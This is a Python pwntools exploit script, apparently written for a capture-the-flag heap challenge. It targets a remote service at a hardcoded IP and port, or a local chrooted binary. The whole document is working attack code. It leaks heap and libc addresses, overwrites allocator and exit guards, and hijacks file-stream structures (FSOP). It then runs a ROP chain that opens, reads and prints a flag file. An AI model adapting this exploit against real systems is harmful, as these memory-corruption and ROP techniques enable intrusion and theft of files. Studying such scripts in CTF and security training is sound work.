from pwn import *
def cmd(c):
    p.sendafter(":",str(c).encode('utf-8'))
def add(magic=0xff,idx=0,c=b'A'):
    cmd(1)
    p.send(p32(magic))
    p.send(p8(idx))
    if(magic<0x1000):
        p.send(c)
def leave(idx=0):
    cmd(2)
    p.send(p8(idx))
def read(c,idx=0):
    cmd(3)
    p.send(p8(idx))
    p.send(c)
def show(idx=0):
    cmd(4)
    p.send(p8(idx))


def ddd():
    global p
    print(pidof(p))
    raw_input()
import os
local=0
if(1):
    try:
        if(local):
            p=process(b"/usr/sbin/chroot --userspec=1000:1000 /home/ctf ./pwn".split(b" "))
        else:
            p=remote("43.155.68.132",23333,timeout=90)
        
        context.terminal=['tmux','split','-h']
        add(0xfff,0,b"\1")
        add(0x888,1,b'\2')
        

        add(0x1fd0,1,b'1')
        leave(1)
        show(1)
        p.read(0x30)
        heap=u64(p.read(6)+b'\0\0')-(0x55e4fd7ef1a8-0x000055e4fd7ef000)
        log.warning(hex(heap))
        context.log_level='error'
        

        add(0x38)# 


        if(local):
            pid=pidof(p)
            pid = str(pid)[1:-1]
            ccc=f"sed -n '5p' /proc/{pid}/maps"
            res=os.popen(ccc).read()[:12]
            bss = int("0x"+res,16)
            log.warning(hex(bss))
        else:
            bss = heap-0x132000
        
        target = heap-bss -0xfa0
        #log.warning(hex(target))
        add(target+0xf0)
        leave()
        
        show()
        p.read(0x30)
        base=u64(p.read(6)+b'\0\0')-(0x7efd9dcd1040-0x00007efd9dc1a000)
        
        if(base&0xfff!=0):
            exit(1)
        log.warning(hex(base))
        
        #AAR
        #add(0x80,1,p64(0xdeadbeef))
        FK = 0x7f5a39a37f80-0x7f5a39981000+base
        log.warning("Calloc Guard->"+hex(FK))
        add((0x140+heap) - (bss+0xfa0),0)
        leave()
        add((0x140+heap) - (bss+0xfa0)+0x100,0)
        
        read(p64(FK-0x30))
        add(0x80,1,p64(0)*2+p64(0xffffffffffffffff))
        
        # add(0xc0,1,p64(0xdeadbeef))#locate
        
        GUARD = 0x7fd7b6e3af20-0x7fd7b6d84000+base# exit guard
        context.log_level='debug'
        log.warning("Exit Guard->"+hex(GUARD))
        add((0x168+heap) - (bss+0xfa0),0)
        leave()
        add((0x168+heap) - (bss+0xfa0)+0x100,0)
        read(p64(GUARD-0x30))


        add(0xb0,1,p64(0).ljust(0x50,b'\0')+p64(0xffffffffffffffff)*3)
#        add(0xd0,1,p64(0xdeadbeef))# locate

        context.arch='amd64'
        rdx = 0x000000000002cdae+base
        rdi = 0x00000000000152a1+base
        rsi = 0x000000000007897d+base # rbp
        rax = 0x0000000000016a96+base
        leaver = 0x000000000007b088+base
        sys_read = 0x7f2ea1052f10-0x7f2ea0fde000+base
        sys_open = 0x7f2ea0ffda70-0x7f2ea0fde000+base
        sys_write = 0x7f2ea1053700-0x7f2ea0fde000+base
        rebase = 0x7f2ea10923f8-0x7f2ea0fde000+base
        syscall = 0x7b3f6+base
        payload = flat([
            0,0,
            0xdeadbeef,
            0x0000000000016e7e+base,
            0xb43c0+base,
            0xb43c0+base-0x40,
            0xdeadbeef,
            rsi,
            rebase,leaver,rdi,0,rdx,0x1000,sys_read,3,4,0xffffffffffffffff
        ])
        FSOP = 0xb43a0+base
        log.warning("FSOP->"+hex(FSOP))
        add((0xa0+heap) - (bss+0xfa0),0)
        leave()
        add((0xa0+heap) - (bss+0xfa0)+0x100,0)
        read(p64(FSOP-0x30))
        
        add(0xd0,1,payload)
        #ddd()
        
        cmd(5)
        rop=flat([
        rdi,rebase+0x199,rsi,0,0,rdx,0,rax,2,syscall,
        rdi,3,rsi,rebase,0,rdx,0x99,sys_read,
        rdi,1,rsi,rebase,0,rdx,0x99,sys_write
        ])
        p.send(rop.ljust(0x199,b'\0')+b"./flag\0")
        
        t=p.readuntil(b"\n")
        res=p.read()
        print(res)
        log.warning(hex(base))
        raw_input()
        
        #gdb.attach(p,'vmmap')
        p.interactive()
    except Exception:
        p.close()
